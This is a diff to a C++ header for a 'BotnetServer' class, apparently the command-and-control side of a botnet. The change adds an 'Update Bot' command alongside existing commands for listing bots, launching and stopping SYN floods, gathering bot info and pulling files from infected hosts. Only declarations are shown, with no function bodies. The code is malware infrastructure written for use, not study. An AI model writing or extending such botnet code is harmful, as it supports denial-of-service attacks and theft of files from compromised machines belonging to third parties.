@@ -25,11 +25,11 @@ public:
 	* and it to the "func_vector" below, also in the same order as the enum.
 	* Code 0, keep-alive is private, and can not be called by the user.
 	*/
-	typedef enum { KEEP_ALIVE, PRINT_BOTS, SYN_FLOOD, STOP_FLOOD, GET_INFO, GET_FILE } Commands;
+	typedef enum { KEEP_ALIVE, PRINT_BOTS, SYN_FLOOD, STOP_FLOOD, GET_INFO, GET_FILE, UPDATE_BOT } Commands;
 private:
 	std::vector<std::string> GetCommandsList() const {
 		// Keep Alive is a private code, don't list
-		static std::vector<std::string> commands = {"Print Bots", "SYN Flood", "Stop Flood", "Get Info", "Get File"};
+		static std::vector<std::string> commands = {"Print Bots", "SYN Flood", "Stop Flood", "Get Info", "Get File", "Update Bot"};
 		return commands;
 	};
 	typedef void (BotnetServer::*CommandFunction)();
@@ -41,6 +41,7 @@ private:
 			, &BotnetServer::StopFlood
 			, &BotnetServer::GetInfo
 			, &BotnetServer::GetFile
+			, &BotnetServer::UpdateBot
 		};
 
 		return func_vector[command];
@@ -77,6 +78,7 @@ private:
 	void StopFlood();
 	void GetInfo();
 	void GetFile();
+	void UpdateBot();
 
 
 	/* Botnet commands helpers */
@@ -108,6 +110,7 @@ private:
 
 	uint16_t ReadPort();
 	std::deque<tcpSocket> GetBotQueue();
+	std::string GetSepperator() const;
 
 };
 
